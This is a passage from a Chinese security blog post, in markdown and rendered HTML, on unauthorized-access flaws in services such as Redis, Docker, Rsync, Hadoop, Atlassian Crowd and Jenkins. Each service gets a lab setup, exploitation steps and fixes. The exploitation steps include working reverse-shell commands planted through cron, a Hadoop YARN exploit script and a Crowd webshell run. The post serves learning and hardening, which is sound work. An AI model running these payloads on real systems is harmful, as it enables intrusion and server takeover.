必须本地拉取新的id值\n//新建计划任务\necho '* * * * * /usr/bin/nc 172.16.144.135 9988 -e /bin/sh' >> /tmp/root\n//获取计划任务信息列表\ncat /tmp/root\n```\n\n![image-20200707103740566](/images/Unauthorized/image-20200707103740566.png)\n\n反弹成功\n\n![image-20200707103806562](/images/Unauthorized/image-20200707103806562.png)\n\n3、未授权访问检测\n\n```shell\n//此脚本可以检测未授权访问漏洞，反弹shell未实验\nhttps://github.com/Tycx2ry/docker_api_vul\n```\n\n##### 漏洞修复\n\n1、2375端口做网络访问控制\n\n2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。\n\n#### ZooKeeper 未授权访问\n\n##### 漏洞描述\n\nZookeeper是分布式协同管理工具，常用来管理系统配置信息，提供分布式协同服务。Zookeeper的默认开放端口是2181。Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz\ntar -xzvf zookeeper-3.4.14.tar.gz \ncd zookeeper-3.4.14/conf\nmv zoo_sample.cfg zoo.cfg\n../bin/zkServer.sh start\t//服务启动\n../bin/zkServer.sh stop\t  //服务停止\n```\n\n![image-20200707111251952](/images/Unauthorized/image-20200707111251952.png)\n\n1、未授权访问\n\n```\necho envi|nc 172.16.144.135 2181\n```\n\n![image-20200707111357506](/images/Unauthorized/image-20200707111357506.png)\n\n2、ZooKeeper可视化\n\n```\nhttps://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip\n```\n\n![image-20200707111758244](/images/Unauthorized/image-20200707111758244.png)\n\n![image-20200707112356764](/images/Unauthorized/image-20200707112356764.png)\n\n##### 漏洞修复\n\n1、修改 ZooKeeper 默认端口，采用其他端口服务\n\n2、添加访问控制，配置服务来源地址限制策略\n\n3、增加 ZooKeeper 的认证配置\n\n#### Rsync 未授权访问\n\n##### 漏洞描述\n\n​\tRsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 `837`。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//下载项目\nhttps://github.com/vulhub/vulhub/tree/master/rsync/common\n//启动容器\n# docker-compose build && docker-compose up -d\n# docker ps -a\nCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES\n5c1eb59de4a8        common_rsync        \"/docker-entrypoin...\"   13 seconds ago      Up 12 seconds       0.0.0.0:873->873/tcp   common_rsync_1\n```\n\n1、未授权检测\n\n```shell\n# rsync rsync://{target_ip}/\n➜  Downloads rsync rsync://172.16.144.135:873/\nsrc            \tsrc path\n//下载文件至本地\n➜  Downloads rsync rsync://172.16.144.135:873/src/etc/passwd ./\n```\n\n2、反弹shell\n\n```shell\n# 下载crontab配置文件\nrsync rsync://172.16.2.250:873/src/etc/crontab ./\n# 该环境crontab中\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n表示每小时的第17分钟执行run-parts --report /etc/cron.hourly\n```\n\n```shell\n# 写入bash并赋权\nvim nc\n#!/bin/bash\n/bin/bash -i >& /dev/tcp/172.16.144.135/9999 0>&1\nchmod 777 nc\n# 将文件上传至/etc/cron.hourly\nrsync -av nc rsync://172.16.144.135:873/src/etc/cron.hourly\n```\n\n![image-20200707115044398](/images/Unauthorized/image-20200707115044398.png)\n\n```shell\n# 本地监听9999\nnc -lnvp 9999\n```\n\n![image-20200707121738127](/images/Unauthorized/image-20200707121738127.png)\n\n##### 漏洞修复\n\n1、账户认证：正确配置认证用户名及密码\n\n2、权限控制：使用合理的权限\n\n3、网络访问控制：控制接入源ip\n\n4、数据加密传输等\n\n#### Atlassian Crowd 未授权访问\n\n##### 漏洞描述\n\n​\tAtlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nwget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip\nunzip atlassian-crowd-3.4.3.zip\ncd atlassian-crowd-3.4.3\nvim crowd-webapp/WEB-INF/classes/crowd-init.properties\n//取消注释\ncrowd.home=/var/crowd-home\n```\n\n执行“Set up Crowd”\n\n![image-20200708113709624](/images/Unauthorized/image-20200708113709624.png)\n\n申请30天试用[license](https://my.atlassian.com/products/index)\n\n```shell\nhttps://my.atlassian.com/license/evaluation?utm_nooverride=1&product=Crowd&version=3.4.3&sid=Server ID&ref=prod\n```\n\n![image-20200708120448211](/images/Unauthorized/image-20200708120448211.png)\n\n如下图所示：安装成功\n\n![image-20200708133857021](/images/Unauthorized/image-20200708133857021.png)\n\n1、未授权测试\n\n```shell\n➜  Atlassian git clone https://github.com/jas502n/CVE-2019-11580.git\n➜  CVE-2019-11580 git:(master) sudo python CVE-2019-11580.py http://172.16.144.135:8095/\nhttp://172.16.144.135:8095//crowd/admin/uploadplugin.action\n\nInstalled plugin /root/atlassian-crowd-3.4.3/apache-tomcat/temp/plugindev-3858334950456985130rce.jar\n\n>>>Get Webshell\t\t\t//已经getshell\n\nhttp://172.16.144.135:8095//crowd/plugins/servlet/exp?cmd=whoami\n\nExec command= whoami\n\nResult= root\n```\n\n![image-20200708134835246](/images/Unauthorized/image-20200708134835246.png)\n\n```shell\n➜  CVE-2019-11580 git:(master) curl http://172.16.144.135:8095//crowd/plugins/servlet/exp\\?cmd\\=id\n```\n\n##### 漏洞修复\n\n1、设置访问/crowd/admin/uploadplugin.action的源ip\n\n2、版本升级\n\n#### CouchDB 未授权访问\n\n##### 漏洞描述\n\n​\tApache CouchDB是一个开源数据库，专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）,默认会在`5984`端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。\n\n​\t在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# mkdir couchdb\n# wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml\n# docker-compose build && docker-compose up -d\n```\n\n![image-20200709010005589](/images/Unauthorized/image-20200709010005589.png)\n\n1、未授权访问\n\n```shell\ncurl http://127.0.0.1:5984\ncurl http://127.0.0.1:5984/_config\n```\n\n![image-20200709005955776](/images/Unauthorized/image-20200709005955776.png)\n\n![image-20200709010449342](/images/Unauthorized/image-20200709010449342.png)\n\n##### 漏洞修复\n\n1、添加认证入口\n\n#### Elasticsearch 未授权访问\n\n##### 漏洞描述\n\n​\t\tElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。\n  Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\nElasticSearch必须jdk8\n//新建用户\n# useradd elasticsearch\n# passwd elasticsearch\n# su elasticsearch\n[elasticsearch@localhost ~]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.0.zip\n# unzip elasticsearch-5.5.0.zip\n# cd /elasticsearch-5.5.0/bin\n$ ./elasticsearch -d\n```\n\n1、未授权访问\n\n```shell\n$ curl  127.0.0.1:9200\n```\n\n![image-20200708235939239](/images/Unauthorized/image-20200708235939239.png)\n\n```shell\n$ curl http://172.16.144.135:9200/_nodes\n```\n\n![image-20200709002204225](/images/Unauthorized/image-20200709002204225.png)\n\n##### 漏洞修复\n\n1、访问控制策略，限制IP访问，绑定固定IP\n\n2、在config/elasticsearch.yml中为9200端口设置认证等\n\n#### Hadoop 未授权访问\n\n##### 漏洞描述\n\n​\t\tHadoop是一个由Apache基金会所开发的分布式系统基础架构，由于服务器直接在开放了 Hadoop 机器 HDFS 的 50070 web 端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。\n\n​\t\tHadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n//拉取docker-compose\nmkdir hadoop\ncd hadoop/\nwget https://raw.githubusercontent.com/vulhub/vulhub/master/hadoop/unauthorized-yarn/docker-compose.yml\n//编译并启动\ndocker-compose build && docker-compose up -d\n```\n\n1、未授权访问\n\n```shell\nhttp://172.16.144.139:8088/cluster\n```\n\n![image-20200709140307458](/images/Unauthorized/image-20200709140307458.png)\n\n2 、命令执行\n\n本地监听端口，并执行以下exp脚本。\n\nexp.py\n\n```python\n#!/usr/bin/env python\n\nimport requests\n\ntarget = 'http://192.168.18.129:8088/'\nlhost = '192.168.18.138' # put your local host ip here, and listen at port 9999\n\nurl = target + 'ws/v1/cluster/apps/new-application'\nresp = requests.post(url)\napp_id = resp.json()['application-id']\nurl = target + 'ws/v1/cluster/apps'\ndata = {\n    'application-id': app_id,\n    'application-name': 'get-shell',\n    'am-container-spec': {\n        'commands': {\n            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,\n        },\n    },\n    'application-type': 'YARN',\n}\nrequests.post(url, json=data)\n```\n\n3、反弹shell\n\n![image-20200709140921090](/images/Unauthorized/image-20200709140921090.png)\n\n##### 漏洞修复\n\n1、如无必要，关闭 Hadoop Web 管理页面\n\n2、开启身份验证，防止未经授权用户访问\n\n3、设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口。\n\n#### Jupyter Notebook 未授权访问\n\n##### 漏洞描述\n\n​\t\tJupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。\n如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。\n\n\n\n##### 漏洞验证\n\n0、环境搭建\n\n```shell\n# wget https://raw.githubusercontent.com/vulhub/vulhub/master/jupyter/notebook-rce/docker-compose.yml\n# docker-compose build && docker-compose up -d\n默认监听8888端口\n```\n\n1、未授权访问\n\n```shell\nhttp://172.16.144.139:8888/\n```\n\n![image-20200709145828298](/images/Unauthorized/image-20200709145828298.png)\n\n2、命令执行\n\n```\nhttp://172.16.144.139:8888/terminals/1\n```\n\n![image-20200709145911206](/images/Unauthorized/image-20200709145911206.png)\n\n##### 漏洞修复\n\n1、开启身份验证，防止未经授权用户访问\n\n2、访问控制策略，限制IP访问，绑定固定IP\n\n#### 监听端口\n\n以上未授权漏洞程序默认监听端口情况如下：\n\n```shell\nReids\t: 6379\nMongoDB : 27017\nJenkins : 8089\nMemcached : 11211\nJBoss\t:\t8080\nVNC :\t5900、5901\nDocker\t:\t2375\nZooKeeper : 2181\nRsync\t:\t837\nAtlassian Crowd\t:\t8095\nCouch DB\t:\t5984\nElasticSearch\t: 9200、9300\nHadoop\t:\t 8088\nJupyter Notebook\t:\t8888\n```\n\n#### 参考\n\n```\nhttps://xz.aliyun.com/t/6103#toc-4\nhttps://paper.seebug.org/409/\n```\n","slug":"常见未授权访问","published":1,"updated":"2020-10-23T02:29:24.250Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckglobhec0013b1hq426l8y07","content":"<p>本文主要介绍和学习关于“未授权访问”漏洞；从字面了解到“未授权”指的是部署的系统未启用认证功能而被直接访问/操作的安全隐患/漏洞。</p>\n<p>感谢前人大佬整理,内容参考网上大佬文章整理，您也可直接<a href=\"https://xz.aliyun.com/t/6103#toc-12\">看这里</a>.漏洞环境参考<a href=\"https://github.com/vulhub/vulhub\">Vulhub</a>,部分环境根据漏洞影响范围来选择安装和搭建.</p>\n<p><img src=\"/images/Unauthorized/image-20200709163151943.png\" alt=\"image-20200709163151943\"></p>\n<center>虚拟机22G</center>\n\n\n<h4 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下环境基本基于centos 7虚拟机部署检测完成。</span><br><span class=\"line\">1.Docker</span><br><span class=\"line\">2.jdk 1.8</span><br><span class=\"line\">3.docker-compose</span><br><span class=\"line\">4.其他参考各漏洞环境搭建部分.</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Redis未授权访问\"><a href=\"#Redis未授权访问\" class=\"headerlink\" title=\"Redis未授权访问\"></a>Redis未授权访问</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>\n<h5 id=\"漏洞验证\"><a href=\"#漏洞验证\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tar xzvf redis-2.8.17.tar.gz</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> redis-2.8.17</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> make</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> src/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis-server /usr/bin/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis-cli /usr/bin/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp redis.conf /etc/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> redis-server /etc/redis.conf</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200703144429633.png\" alt=\"image-20200703144429633\"></p>\n<p>1、连接Redis</p>\n<p>本地可下载客户端进行连接Redis进行getshell等操作</p>\n<p><img src=\"/images/Unauthorized/image-20200703144858785.png\" alt=\"image-20200703144858785\"></p>\n<p><img src=\"/images/Unauthorized/image-20200703144912904.png\" alt=\"image-20200703144912904\"></p>\n<center>如上图所示连接成功</center>\n2、getshell\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 攻击机执行nc监听</span></span><br><span class=\"line\">nc -lvnp 9999</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Redis客户端执行</span></span><br><span class=\"line\">set shell &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.144.141/9999 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>还有其他方式进行反弹shell可网上参考</p>\n<p><img src=\"/images/Unauthorized/image-20200704093747944.png\" alt=\"image-20200704093747944\"></p>\n<center>getshell</center>\n\n\n<h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、限制登录ip</p>\n<p>2、添加密码</p>\n<p>3、修改默认端口</p>\n<h4 id=\"MongoDB-未授权访问\"><a href=\"#MongoDB-未授权访问\" class=\"headerlink\" title=\"MongoDB 未授权访问\"></a>MongoDB 未授权访问</h4><h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>​    开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。</p>\n<p>​    造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。</p>\n<h5 id=\"漏洞验证-1\"><a href=\"#漏洞验证-1\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//镜像搜索</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker search mongodb</span></span><br><span class=\"line\">//拉取镜像</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker pull mongo</span></span><br><span class=\"line\">//显示mongo镜像</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker images mongo</span></span><br><span class=\"line\">//创建新的容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker run -d -p 27017:27017 --name mongodb mongo</span></span><br><span class=\"line\">//显示所有容器</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> docker ps -a</span></span><br></pre></td></tr></table></figure>\n\n<p>1、NoSQLBooster连接</p>\n<p><img src=\"/images/Unauthorized/image-20200704122547655.png\" alt=\"image-20200704122547655\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、MongoDB添加认证：MongoDB启动时添加–auth参数、为MongoDB添加用户</p>\n<p>2、启动时加入参数–bind_ip 127.0.0.1 或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1</p>\n<h4 id=\"Jenkins-未授权访问\"><a href=\"#Jenkins-未授权访问\" class=\"headerlink\" title=\"Jenkins 未授权访问\"></a>Jenkins 未授权访问</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>默认情况下 Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</p>\n<h5 id=\"漏洞验证-2\"><a href=\"#漏洞验证-2\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//安装并启动Jenkins服务</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> rpm -ivh jenkins-2.7.3-1.1.noarch.rpm</span></span><br><span class=\"line\">//修改默认端口</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /etc/sysconfig/jenkins</span></span><br><span class=\"line\">JENKINS_PORT=&quot;8089&quot;</span><br><span class=\"line\">//jenkins服务启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> service jenkins start</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706091405075.png\" alt=\"image-20200706091405075\"></p>\n<p><img src=\"/images/Unauthorized/image-20200706091522419.png\" alt=\"image-20200706091522419\"></p>\n<p>1、浏览器访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.142:8089/login?from=%2F</span><br><span class=\"line\">//浏览器访问后输入文件内的密码</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /var/lib/jenkins/secrets/initialAdminPassword</span></span><br></pre></td></tr></table></figure>\n\n<p>2、未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;系统</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.142:8089&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706094611260.png\" alt=\"image-20200706094611260\"></p>\n<p>3、执行命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">println &quot;whoami&quot;.execute().text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706095024778.png\" alt=\"image-20200706095024778\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、版本升级</p>\n<p>2、添加认证，设置强密码复杂度及账号锁定</p>\n<p>3、禁止把Jenkins直接暴露在公网</p>\n<h4 id=\"Memcached-未授权访问\"><a href=\"#Memcached-未授权访问\" class=\"headerlink\" title=\"Memcached 未授权访问\"></a>Memcached 未授权访问</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>Memcached是一个自由开源的，高性能，分布式内存对象缓存系统。</p>\n<p>Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。 </p>\n<p> Memcached简洁而强大。它的简洁设计便于快速开发，减轻开发难度，解决了大数据量缓存的很多问题。它的API兼容大部分流行的开发语言。 </p>\n<p> 本质上，它是一个简洁的key-value存储系统。 </p>\n<p>一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 </p>\n<h5 id=\"漏洞验证-3\"><a href=\"#漏洞验证-3\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>0、环境搭建</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//安装</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum install memcached</span></span><br><span class=\"line\">//启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> systemctl status  memcached.service</span></span><br><span class=\"line\">//查看默认配置</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cat /etc/sysconfig/memcached</span></span><br></pre></td></tr></table></figure>\n\n<p>1、telnet连接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet 172.16.144.142 11211</span><br><span class=\"line\">nc -vv 172.16.144.142 11211</span><br><span class=\"line\">无需用户名密码，可以直接连接memcache</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706104012663.png\" alt=\"image-20200706104012663\"></p>\n<p><img src=\"/images/Unauthorized/image-20200706110511684.png\" alt=\"image-20200706110511684\"></p>\n<p>2、nmap检测</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -p 11211 --script memcached-info 172.16.144.142</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200706105609418.png\" alt=\"image-20200706105609418\"></p>\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>-设置Memchached只允许本地访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPTIONS=&quot;-l 127.0.0.1&quot;\t\t//只允许本地访问</span><br></pre></td></tr></table></figure>\n\n<p>-禁止外网访问Memcached 11211端口</p>\n<h4 id=\"JBOSS-未授权访问\"><a href=\"#JBOSS-未授权访问\" class=\"headerlink\" title=\"JBOSS 未授权访问\"></a>JBOSS 未授权访问</h4><h5 id=\"漏洞描述-4\"><a href=\"#漏洞描述-4\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <code>http://ip:8080/jmx-console</code> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>\n<h5 id=\"漏洞验证-4\"><a href=\"#漏洞验证-4\" class=\"headerlink\" title=\"漏洞验证\"></a>漏洞验证</h5><p>可参考JBoss漏洞介绍部分</p>\n<p>1、URL访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154251373.png\" alt=\"image-20200702154251373\"></p>\n<p>2、访问<code>JMX Console</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;或直接访问这个地址</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;jmx-console&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154332658.png\" alt=\"image-20200702154332658\"></p>\n<p>3、部署远程war</p>\n<p><img src=\"/images/Unauthorized/image-20200702154524903.png\" alt=\"image-20200702154524903\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输入远程构造好的war的URL并点击“Invoke”</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Unauthorized/image-20200702154726454.png\" 